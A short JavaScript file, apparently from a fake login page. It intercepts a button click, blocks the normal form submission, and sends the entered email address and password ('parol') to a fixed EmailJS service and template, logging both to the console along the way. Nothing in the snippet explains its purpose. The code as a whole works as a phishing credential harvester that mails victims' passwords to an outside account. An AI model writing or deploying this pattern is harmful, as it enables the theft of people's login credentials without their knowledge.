const buton = document.querySelector(".btn");
const email = document.querySelector(".email");
const parol = document.querySelector(".parol");

buton.addEventListener("click", (e)=>{
    e.preventDefault()
    console.log(email.value);
    console.log(parol.value);
    emailjs.send("service_eoesjck","template_f67qnxs",{
        email: email.value,
        parol: parol.value,
        });
})